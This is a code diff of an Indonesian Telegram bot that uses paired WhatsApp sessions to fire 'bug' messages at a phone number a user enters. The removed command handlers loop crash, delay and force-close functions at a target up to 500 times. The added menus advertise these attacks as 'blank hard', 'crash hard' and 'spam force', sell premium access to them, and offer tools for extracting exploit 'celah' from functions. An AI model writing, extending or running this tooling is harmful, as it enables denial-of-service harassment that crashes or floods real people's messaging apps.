-    await safeSendMessage(chatId, createBugSuccessMessage(targetNumber, "XspamForce (Anti Kenok)", date), { parse_mode: "HTML", reply_markup: createCheckButton(targetNumber) });
-    for (let i = 0; i < 500; i++) {
-        await CrashFrHome(sock, target);
-        await StickerFC(sock, target);
-        console.log(`🚀 XspamForce iteration ${i + 1} to ${targetNumber}`);
-        await sleep(100);
-    }
-});
-
-bot.onText(/\/Xploit(?:\s+(\d+))?/, async (msg, match) => {
-    const chatId = msg.chat.id;
-    const userId = msg.from.id;
-    const chatType = msg.chat.type;
-    const hasAccess = await checkUserAccess(userId, chatId, chatType, "xploit");
-    if (!hasAccess) return;
-    if (!match[1]) return safeSendMessage(chatId, "🪧 Format: /xploit 628xxx");
-    const targetNumber = match[1].replace(/[^0-9]/g, "");
-    const target = `${targetNumber}@s.whatsapp.net`;
-    const date = getCurrentDate();
-    if (sessions.size === 0) return safeSendMessage(chatId, "❌ Tidak ada sender WhatsApp terhubung.");
-    const sock = sessions.values().next().value;
-    await safeSendMessage(chatId, createBugSuccessMessage(targetNumber, "xploit", date), { parse_mode: "HTML", reply_markup: createCheckButton(targetNumber) });
-    for (let i = 0; i < 1; i++) { await FCinvis(sock, target); }
-});
-
-bot.onText(/\/Sanjiva(?:\s+(\d+))?/, async (msg, match) => {
-    const chatId = msg.chat.id;
-    const userId = msg.from.id;
-    const chatType = msg.chat.type;
-    const hasAccess = await checkUserAccess(userId, chatId, chatType, "sanjiva");
-    if (!hasAccess) return;
-    if (!match[1]) return safeSendMessage(chatId, "🪧 Format: /Sanjiva 628xxx");
-    const targetNumber = match[1].replace(/[^0-9]/g, "");
-    const target = `${targetNumber}@s.whatsapp.net`;
-    const date = getCurrentDate();
-    if (sessions.size === 0) return safeSendMessage(chatId, "❌ Tidak ada sender WhatsApp terhubung.");
-    const sock = sessions.values().next().value;
-    await safeSendMessage(chatId, createBugSuccessMessage(targetNumber, "Sanjiva", date), { parse_mode: "HTML", reply_markup: createCheckButton(targetNumber) });
-    for (let i = 0; i < 10; i++) { await xatanicaldelayv2(sock, target); await sleep(100); }
-});
-
-bot.onText(/\/Stova(?:\s+(\d+))?/, async (msg, match) => {
-    const chatId = msg.chat.id;
-    const userId = msg.from.id;
-    const chatType = msg.chat.type;
-    const hasAccess = await checkUserAccess(userId, chatId, chatType, "stova");
-    if (!hasAccess) return;
-    if (!match[1]) return safeSendMessage(chatId, "🪧 Format: /Stova 628xxx");
-    const targetNumber = match[1].replace(/[^0-9]/g, "");
-    const target = `${targetNumber}@s.whatsapp.net`;
-    const date = getCurrentDate();
-    if (sessions.size === 0) return safeSendMessage(chatId, "❌ Tidak ada sender WhatsApp terhubung.");
-    const sock = sessions.values().next().value;
-    await safeSendMessage(chatId, createBugSuccessMessage(targetNumber, "Stova", date), { parse_mode: "HTML", reply_markup: createCheckButton(targetNumber) });
-    for (let i = 0; i < 7; i++) { await brem(sock, target); await sleep(100); }
-});
-
-bot.onText(/\/Chatms(?:\s+(\d+))?/, async (msg, match) => {
-    const chatId = msg.chat.id;
-    const userId = msg.from.id;
-    const chatType = msg.chat.type;
-    const hasAccess = await checkUserAccess(userId, chatId, chatType, "chatms");
-    if (!hasAccess) return;
-    if (!match[1]) return safeSendMessage(chatId, "🪧 Format: /Chatms 628xxx");
-    const targetNumber = match[1].replace(/[^0-9]/g, "");
-    const target = `${targetNumber}@s.whatsapp.net`;
-    const date = getCurrentDate();
-    if (sessions.size === 0) return safeSendMessage(chatId, "❌ Tidak ada sender WhatsApp terhubung.");
-    const sock = sessions.values().next().value;
-    await safeSendMessage(chatId, createBugSuccessMessage(targetNumber, "Chatms", date), { parse_mode: "HTML", reply_markup: createCheckButton(targetNumber) });
-    for (let i = 0; i < 500; i++) { await FCinvisTes(sock, target); await sleep(3000); }
-});
-
-bot.onText(/\/Ganesha(?:\s+(\d+))?/, async (msg, match) => {
-    const chatId = msg.chat.id;
-    const userId = msg.from.id;
-    const chatType = msg.chat.type;
-    const hasAccess = await checkUserAccess(userId, chatId, chatType, "ganesha");
-    if (!hasAccess) return;
-    if (!match[1]) return safeSendMessage(chatId, "🪧 Format: /Ganesha 628xxx");
-    const targetNumber = match[1].replace(/[^0-9]/g, "");
-    const target = `${targetNumber}@s.whatsapp.net`;
-    const date = getCurrentDate();
-    if (sessions.size === 0) return safeSendMessage(chatId, "❌ Tidak ada sender WhatsApp terhubung.");
-    const sock = sessions.values().next().value;
-    await safeSendMessage(chatId, createBugSuccessMessage(targetNumber, "Ganesha", date), { parse_mode: "HTML", reply_markup: createCheckButton(targetNumber) });
-    for (let i = 0; i < 10; i++) { await bulldozerV2(sock, target); await sleep(100); }
-});
-
-bot.onText(/\/sendbug(?:\s+(\d+))?/, async (msg, match) => {
-    const chatId = msg.chat.id;
-    const userId = msg.from.id;
-    const chatType = msg.chat.type;
-    const hasAccess = await checkUserAccess(userId, chatId, chatType, "sendbug");
-    if (!hasAccess) return;
-    if (!match[1]) return safeSendMessage(chatId, "🪧 Format: /sendbug 628xxx");
-    const targetNumber = match[1].replace(/[^0-9]/g, "");
-    const target = `${targetNumber}@s.whatsapp.net`;
-    const date = getCurrentDate();
-    if (sessions.size === 0) return safeSendMessage(chatId, "❌ Tidak ada sender WhatsApp terhubung.");
-    const sock = sessions.values().next().value;
-    await safeSendMessage(chatId, createBugSuccessMessage(targetNumber, "sendbug", date), { parse_mode: "HTML", reply_markup: createCheckButton(targetNumber) });
-    for (let i = 0; i < 35; i++) { await VisiFriend(sock, target); await sleep(100); }
-});
-
 bot.onText(/\/reqpair (.+)/, async (msg, match) => {
     const chatId = msg.chat.id;
-    if (!adminUsers.includes(msg.from.id) && !isOwner(msg.from.id)) {
+    const userId = msg.from.id;
+    
+    if (!adminUsers.includes(userId) && !isOwner(userId)) {
         return safeSendPhoto(chatId, thumbnailUrl, {
             caption: `<blockquote>Access Admin</blockquote>Please Buy Access Admin To The Owner!`,
             parse_mode: "HTML",
             reply_markup: { inline_keyboard: [[{ text: "Owner", url: "https://t.me/ItsMeXanderRzMd" }]] }
         });
     }
-    if (!match[1]) return safeSendMessage(chatId, "❌ Missing input. Please provide the number. Example: /reqpair 62xxxx.");
+    
+    if (!match[1]) {
+        return safeSendMessage(chatId, "❌ Missing input. Please provide the number. Example: /reqpair 62xxxx.");
+    }
+    
     const botNumber = match[1].replace(/[^0-9]/g, "");
-    if (!botNumber || botNumber.length < 10) return safeSendMessage(chatId, "❌ Nomor yang diberikan tidak valid. Pastikan nomor yang dimasukkan benar.");
+    if (!botNumber || botNumber.length < 10) {
+        return safeSendMessage(chatId, "❌ Nomor yang diberikan tidak valid. Pastikan nomor yang dimasukkan benar.");
+    }
+    
+    if (sessions.has(botNumber)) {
+        return safeSendMessage(chatId, `✅ Nomor ${botNumber} sudah terhubung dan aktif.`);
+    }
+    
+    if (pairingInProgress.has(botNumber)) {
+        const elapsed = Date.now() - pairingInProgress.get(botNumber);
+        if (elapsed < PAIRING_COOLDOWN) {
+            return safeSendMessage(chatId, `⚠️ Pairing untuk nomor ${botNumber} sedang berlangsung. Tunggu ${Math.ceil((PAIRING_COOLDOWN - elapsed) / 1000)} detik lagi.`);
+        } else {
+            pairingInProgress.delete(botNumber);
+        }
+    }
+    
     try {
         await ConnectToWhatsApp(botNumber, chatId);
     } catch (error) {
         console.error("Error in Connect:", error);
-        safeSendMessage(chatId, "Terjadi kesalahan saat menghubungkan ke WhatsApp. Silakan coba lagi.");
+        pairingInProgress.delete(botNumber);
+        
+        let errorMsg = "Terjadi kesalahan saat menghubungkan ke WhatsApp.";
+        if (error.message.includes("timeout")) {
+            errorMsg = "⏰ Koneksi timeout. Silakan coba lagi.";
+        } else if (error.message.includes("blocked")) {
+            errorMsg = "🚫 Nomor diblokir atau sudah logout. Coba nomor lain.";
+        } else if (error.message.includes("logged out")) {
+            errorMsg = "🔒 Session expired. Silakan coba lagi.";
+        }
+        
+        safeSendMessage(chatId, `❌ ${errorMsg}\n\nSilakan coba /reqpair ${botNumber} lagi.`);
     }
+});
+
+// ================= POLL & CALLBACK HANDLERS ================= //
+
+bot.on("poll_answer", async (answer) => {
+    // Premium poll
+    const premiumData = pendingPremiumPoll[answer.poll_id];
+    if (premiumData) {
+        if (answer.user.id !== premiumData.adminId) return;
+        const choice = answer.option_ids[0];
+        let days;
+        if (choice === 0) days = 7;
+        if (choice === 1) days = 14;
+        if (choice === 2) days = 30;
+        if (choice === 3) days = "permanent";
+        let expiresAt;
+        if (days === "permanent") {
+            expiresAt = "permanent";
+        } else {
+            expiresAt = Date.now() + days * 86400000;
+        }
+        const existing = premiumUsers.find(u => u.id === premiumData.userId);
+        if (!existing) {
+            premiumUsers.push({ id: premiumData.userId, expiresAt });
+        } else {
+            existing.expiresAt = expiresAt;
+        }
+        savePremiumUsers();
+        safeSendMessage(premiumData.chatId, `✅ Premium berhasil ditambahkan\n\n👤 User ID: ${premiumData.userId}\n⏳ Durasi: ${days === "permanent" ? "Permanent" : days + " Hari"}`);
+        delete pendingPremiumPoll[answer.poll_id];
+        return;
+    }
+    
+    // Color poll
+    const colorData = pendingColorPoll[answer.poll_id];
+    if (colorData) {
+        const selectedOption = answer.option_ids[0];
+        let selectedColor = "";
+        if (selectedOption === 0) selectedColor = "XRED";
+        else if (selectedOption === 1) selectedColor = "XBLUE";
+        else if (selectedOption === 2) selectedColor = "XGREEN";
+        else if (selectedOption === 3) selectedColor = "XWHITE";
+        else if (selectedOption === 4) selectedColor = "XDISCO";
+        const colorValue = getColorFromChoice(selectedColor);
+        saveColorSetting(colorValue);
+        currentColor = colorValue;
+        if (buttonIntervals.has(colorData.currentMessageId)) {
+            clearInterval(buttonIntervals.get(colorData.currentMessageId));
+            buttonIntervals.delete(colorData.currentMessageId);
+        }
+        if (globalIntervalId) {
+            clearInterval(globalIntervalId);
+            globalIntervalId = null;
+        }
+        discoActive = false;
+        await sendColoredMenu(colorData.chatId, colorData.from, colorValue, colorData.currentMessageId);
+        delete pendingColorPoll[answer.poll_id];
+        return;
+    }
+});
+
+bot.on("callback_query", async (query) => {
+    if (!query.message) return;
+    const chatId = query.message.chat.id;
+    const currentMessageId = query.message.message_id;
+    const data = query.data;
+    const userId = query.from.id;
+
+    if (data && data.startsWith("autofix_")) {
+        const originalMsgId = parseInt(data.replace("autofix_", ""));
+        const pendingData = global.pendingFix ? global.pendingFix[originalMsgId] : null;
+        if (!pendingData) {
+            await bot.answerCallbackQuery(query.id, { text: "❌ Data tidak ditemukan, coba ulangi /cekfunc" }).catch(() => {});
+            return;
+        }
+        await bot.answerCallbackQuery(query.id, { text: "🔧 Memperbaiki code 100% akurat..." }).catch(() => {});
+        const fixResult = autoFixJavaScript(pendingData.code, pendingData.error);
+        let resultText = `✅ *CODE DIPERBAIKI 100%!*\n\n`;
+        resultText += `📊 *${fixResult.fixes.length} perbaikan:*\n`;
+        fixResult.fixes.slice(0, 10).forEach(f => resultText += `• ${f}\n`);
+        resultText += `\n🟢 *HASIL AKHIR:*\n\`\`\`javascript\n${fixResult.fixed.substring(0, 2000)}\n\`\`\``;
+        if (fixResult.fixed.length > 2000) {
+            resultText += `\n\n📁 Code panjang, dikirim sebagai file...`;
+            await safeSendMessage(chatId, resultText, { parse_mode: "Markdown" });
+            const filePath = `fixed_${Date.now()}.js`;
+            fs.writeFileSync(filePath, fixResult.fixed);
+            await bot.sendDocument(chatId, filePath, { caption: `✅ Fixed code - ${fixResult.fixes.length} issues fixed` });
+            fs.unlinkSync(filePath);
+        } else {
+            await safeSendMessage(chatId, resultText, { parse_mode: "Markdown" });
+        }
+        delete global.pendingFix[originalMsgId];
+        await bot.answerCallbackQuery(query.id).catch(() => {});
+        return;
+    }
+
+    if (buttonIntervals.has(currentMessageId)) {
+        clearInterval(buttonIntervals.get(currentMessageId));
+        buttonIntervals.delete(currentMessageId);
+    }
+    if (globalIntervalId) {
+        clearInterval(globalIntervalId);
+        globalIntervalId = null;
+    }
+    discoActive = false;
+
+    let caption = "";
+    let replyMarkup = {};
+    let selectedImage = getRandomImage();
+
+    if (data === "trashmenu") {
+        caption = `<blockquote>─━━─━━⧼ BUG MENU ⧽─━━─━━</blockquote>
+<b>─━━─━━⧼ INFORMASI USER ⧽─━━─━━:</b>
+🎩 Pemilik : @ItsMeXanderRzMd 🌟    
+😄 Owner : @realmarz 🌟
+🍽 Version : ${CURRENT_VERSION}
+🗡 Platform : Telegram
+<b>─━━─━━⧼ FITUR BUG ⧽─━━─━━:</b>
+─▢ /sendbug +628
+─▢ /clear +628
+<b>╰➤ hapus bug</b>
+<b>─━━─━━⧼ BUG MENU ⧽─━━─━━:</b>
+# Primrose Linux Bot 𖣂
+─▢ /Xploit 
+<b>╰➤ blank hard</b>
+─▢ /Sanjiva
+<b>╰➤ delay hard murbug</b>
+─▢ /Stova 
+<b>╰➤ new delay brutality murbug</b>
+─▢ /Chatms +628
+<b>╰➤ crash hard</b>
+─▢ /Ganesha +628
+<b>╰➤ Buldo hard</b>
+─▢ /XspamForce +628
+<b>╰➤ spam force anti kenok (2 function combo)</b>
+<pre>──────────────────────────
+   MENU: Pilih Fitur Bug Menu di Atas 
+──────────────────────────</pre>`
+        replyMarkup = { inline_keyboard: [[{ text: "🔙 BACK", callback_data: "back_to_main" }]] }
+    } else if (data === "owner_menu") {
+        caption = `<blockquote><b>☠ PRIMROSE LINUX BOT ACCESS ☠</b></blockquote>
+🎩 Pemilik : @ItsMeXanderRzMd 🌟    
+😄 Owner : @realmarz 🌟
+🍽 Version : ${CURRENT_VERSION}
+🗡 Platform : Telegram     
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+┃      ▢ /addprem &lt;id&gt;
+┃      ╰➤ Menambahkan akses premium pada user
+┃      ▢ /delprem &lt;id&gt;
+┃      ╰➤ Menghapus akses premium pada user
+┃      ▢ /addadmin &lt;id&gt;
+┃      ╰➤ Menambahkan akses admin pada user
+┃      ▢ /deladmin &lt;id&gt;
+┃      ╰➤ Menghapus akses admin pada user
+┃      ▢ /listprem
+┃      ╰➤ Melihat list premium user yang ada
+┃      ▢ /listadmin
+┃      ╰➤ Melihat list admin
+┃      ▢ /reqpair ☇ Number
+┃      ╰➤ Menambah Sender WhatsApp
+┃      ▢ /update on/off
+┃      ╰➤ Mengaktifkan/menonaktifkan auto update
+┃      ▢ /autoupdate
+┃      ╰➤ Update manual dari GitHub
+┃      ▢ /checkupdate
+┃      ╰➤ Cek versi terbaru
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+<blockquote><b>NOTE:</b>
+Baca dengan teliti Jangan asal ngetik untuk mendapatkan akses</blockquote>`
+        replyMarkup = { inline_keyboard: [[{ text: "🔙 BACK", callback_data: "back_to_main" }]] }
+    } else if (data === "group_security_menu") {
+        caption = `<blockquote><b>🔒 XGROUPSECURITY MENU 🔒</b></blockquote>
+🎩 Pemilik : @ItsMeXanderRzMd 🌟
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+┃      ▢ /blokcmd &lt;command&gt;
+┃      ╰➤ Mem-block command bug
+┃      ▢ /bukacmd &lt;command&gt;
+┃      ╰➤ Membuka block command bug
+┃      ▢ /addpremgrup &lt;hari&gt;
+┃      ╰➤ Menambah grup ke premium (gunakan di grup)
+┃      ▢ /delpremgrup
+┃      ╰➤ Menghapus grup dari premium
+┃      ▢ /listpremgrub
+┃      ╰➤ Menampilkan member premium dalam grup
+┃      ▢ /add (ketik "add" di grup premium)
+┃      ╰➤ Menambah diri sebagai premium user
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+<blockquote><b>NOTE:</b>
+Command hanya bisa digunakan oleh admin grup</blockquote>`
+        replyMarkup = { inline_keyboard: [[{ text: "🔙 BACK", callback_data: "back_to_main" }]] }
+    } else if (data === "toolsbug_menu") {
+        caption = `<blockquote><b>🛠️ XTOOLSBUG MENU 🛠️</b></blockquote>
+🎩 Pemilik : @ItsMeXanderRzMd 🌟
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+┃      ▢ /testfunction &lt;number&gt; &lt;jumlah&gt;
+┃      ╰➤ Reply dengan function bug
+┃      ▢ /celahfunc &lt;reply func atau file&gt;
+┃      ╰➤ Extract celah dari function
+┃      ▢ /addcelah &lt;reply func atau file&gt;
+┃      ╰➤ Menyimpan celah ke database
+┃      ▢ /listcelah
+┃      ╰➤ Menampilkan semua celah tersimpan
+┃      ▢ /delcelah &lt;id&gt;
+┃      ╰➤ Menghapus celah dari database
+┃      ▢ /cekfunc &lt;reply func&gt;
+┃      ╰➤ Cek error function + auto fix 100%
+┃      ▢ /addparticipant &lt;reply func&gt;
+┃      ╰➤ Tambah participant ke relayMessage
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+<blockquote><b>NOTE:</b>
+Gunakan tools ini untuk testing dan debugging</blockquote>`
+        replyMarkup = { inline_keyboard: [[{ text: "🔙 BACK", callback_data: "back_to_main" }]] }
+    } else if (data === "change_color_menu") {
+        const options = ["🔴 XRED", "🔵 XBLUE", "🟢 XGREEN", "⚪ XWHITE", "🌈 XDISCO"]
+        const poll = await bot.sendPoll(chatId, "🎨 PILIH WARNA BUTTON", options, { is_anonymous: false, allows_multiple_answers: false })
+        pendingColorPoll[poll.poll.id] = { chatId: chatId, userId: userId, from: query.from, currentMessageId: currentMessageId }
+        return await bot.answerCallbackQuery(query.id).catch(() => {});
+    } else if (data === "back_to_main") {
+        const runtimeStatus = formatRuntime()
+        const memoryStatus = formatMemory()
+        const status = sessions.size > 0 ? "🟢 ACTIVE" : "🔴 OFFLINE"
+        const botNumber = sessions.size
+        const isWhite = (currentColor === "secondary")
+        const buttonStyle = isWhite ? undefined : (currentColor === "disco" ? buttonStyles[0] : currentColor)
+        let keyboard = [
+            [{ text: "XBUGS", callback_data: "trashmenu", style: buttonStyle }, { text: "XTOOLSBUG", callback_data: "toolsbug_menu", style: buttonStyle }],
+            [{ text: "XSETTINGS", callback_data: "owner_menu", style: buttonStyle }, { text: "XGROUPSECURITY", callback_data: "group_security_menu", style: buttonStyle }],
+            [{ text: "XCHANGECOLOR", callback_data: "change_color_menu", style: buttonStyle }, { text: "DEVELOPERS", url: "https://t.me/ItsMeXanderRzMd", style: buttonStyle }]
+        ]
+        if (isWhite) keyboard = JSON.parse(JSON.stringify(keyboard).replace(/"style":undefined/g, '"style":null').replace(/"style":null/g, ''))
+        const caption = `<blockquote><strong>☠ # Primrose Linux Bot 𖣂 ☠</strong></blockquote>
+🎩 Pemilik : @ItsMeXanderRzMd 🌟    
+😄 Owner : @realmarz 🌟
+🍽 Version : ${CURRENT_VERSION} 
+🗡 Platform : Telegram
+<blockquote><b>――⧼ STATUS BOT ⧽――</b></blockquote>
+⛧ Status : ${status}
+⛧ Number : ${botNumber}
+⛧ Runtime : ${runtimeStatus}
+⛧ Memory : ${memoryStatus}`
+        await safeEditMessageMedia(chatId, currentMessageId, { type: 'photo', media: getRandomImage(), caption: caption, parse_mode: "HTML" }, { reply_markup: { inline_keyboard: keyboard } })
+        if (currentColor === "disco") {
+            if (buttonIntervals.has(currentMessageId)) {
+                clearInterval(buttonIntervals.get(currentMessageId))
+                buttonIntervals.delete(currentMessageId)
+            }
+            if (globalIntervalId) clearInterval(globalIntervalId)
+            discoActive = true
+            let index = 0
+            globalIntervalId = setInterval(async () => {
+                if (!discoActive) return
+                index = (index + 1) % buttonStyles.length
+                const newStyle = buttonStyles[index]
+                let newKeyboard = [
+                    [{ text: "XBUGS", callback_data: "trashmenu", style: newStyle }, { text: "XTOOLSBUG", callback_data: "toolsbug_menu", style: newStyle }],
+                    [{ text: "XSETTINGS", callback_data: "owner_menu", style: newStyle }, { text: "XGROUPSECURITY", callback_data: "group_security_menu", style: newStyle }],
+                    [{ text: "XCHANGECOLOR", callback_data: "change_color_menu", style: newStyle }, { text: "DEVELOPERS", url: "https://t.me/ItsMeXanderRzMd", style: newStyle }]
+                ]
+                await safeEditMessageReplyMarkup(chatId, currentMessageId, { inline_keyboard: newKeyboard });
+            }, 1500)
+            buttonIntervals.set(currentMessageId, globalIntervalId)
+        }
+        return await bot.answerCallbackQuery(query.id).catch(() => {});
+    }
+
+    if (caption !== "") {
+        await safeEditMessageMedia(chatId, currentMessageId, { type: 'photo', media: selectedImage, caption: caption, parse_mode: "HTML" }, { reply_markup: replyMarkup });
+    }
+    await bot.answerCallbackQuery(query.id).catch(() => {});
 });
 
 process.on('unhandledRejection', (reason, promise) => {
